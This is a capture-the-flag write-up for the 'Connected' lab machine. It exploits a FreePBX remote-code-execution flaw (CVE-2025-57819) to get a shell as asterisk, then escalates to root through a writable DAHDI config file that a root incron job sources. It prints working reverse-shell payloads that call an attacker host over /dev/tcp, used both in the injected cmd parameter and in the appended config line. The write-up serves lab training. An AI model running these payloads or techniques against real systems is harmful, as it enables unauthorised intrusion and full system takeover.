# Connected

## Find open ports and services running on the target IP

Command:

```bash
nmap -sV -sC -T5 <target_ip>
```

The scan reveals a FreePBX web application running on the target.

Add it to the `/etc/hosts` file as su.

---

## Exploit FreePBX RCE Vulnerability

The FreePBX application (16.0.40.7) is vulnerable to CVE-2025-57819, allowing remote command execution.

Exploit used:

https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819

The watchTowr PoC was used to exploit the FreePBX vulnerability and achieve remote command execution.

```bash
python3 cve-2025-57819.py -H http://connected.htb/
```

A reverse shell is obtained by injecting a command through the `cmd` parameter.

Example:

```text
http://connected.htb/...?cmd=bash+-c+'bash+-i+>&+/dev/tcp/<attacker_ip>/<listener_port>+0>&1'
```

Start a Netcat listener:

```bash
nc -lvnp <listener_port>
```

A reverse shell connection is received.

---

## Obtain Initial Shell as asterisk

Check the current user:

```bash
whoami
```

Output:

```text
asterisk
```

Upgrade the shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Retrieve User Flag

Navigate to the asterisk home directory:

```bash
cd /home/asterisk
```

List files:

```bash
ls
```

Read the user flag:

```bash
cat user.txt
```

The user flag is obtained.

---

# Privilege Escalation

## Enumerate incron Jobs

Check for root-triggered automation:

```bash
cat /etc/incron.d/*
```

Discovered:

```text
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

Check the incron process:

```bash
ps aux | grep incron
```

Output:

```text
root ... /usr/sbin/incrond
```

The incron daemon runs as root and executes monitored actions with elevated privileges.

---

## Find Writable Files

Search for writable files:

```bash
find /etc -type f -writable 2>/dev/null
```

A writable configuration file is found:

```text
/etc/dahdi/init.conf
```

---

## Analyze DAHDI Service Execution

Inspect the incron-triggered script:

```bash
cat /usr/sbin/sysadmin_dahdi_restart
```

The script restarts the DAHDI service:

```bash
/etc/init.d/dahdi restart
```

Inspect the DAHDI init script:

```bash
cat /etc/init.d/dahdi
```

The following line reveals the vulnerability:

```bash
[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
```

The script sources `/etc/dahdi/init.conf`.

Since the file is writable by the `asterisk` user and sourced by a root process, attacker-controlled commands can execute with root privileges.

---

## Abuse Writable DAHDI Configuration

Backup the original configuration:

```bash
cp /etc/dahdi/init.conf /tmp/init.conf.backup
```

Append a reverse shell command:

```bash
echo 'bash -c "bash -i >& /dev/tcp/<attacker_ip>/<another_listener_port> 0>&1" &' >> /etc/dahdi/init.conf
```

---

## Trigger Root Execution

Trigger the incron event:

```bash
echo restart > /var/spool/asterisk/sysadmin/dahdi_restart
```

Execution flow:

```text
asterisk
   |
   v
/var/spool/asterisk/sysadmin/dahdi_restart
   |
   v
root incrond
   |
   v
/usr/sbin/sysadmin_dahdi_restart
   |
   v
/etc/init.d/dahdi restart
   |
   v
source /etc/dahdi/init.conf
   |
   v
root shell
```

---

## Retrieve Root Flag

Verify privileges:

```bash
whoami
```

Output:

```text
root
```

Upgrade the shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Navigate to the root directory:

```bash
cd /root
```

Read the root flag:

```bash
cat root.txt
```

The root flag is successfully obtained.

---

# Attack Chain

```text
FreePBX RCE → Get Shell as asterisk → Find incron Jobs → Abuse Writable DAHDI Configuration → Trigger Root Execution → Root Access
```
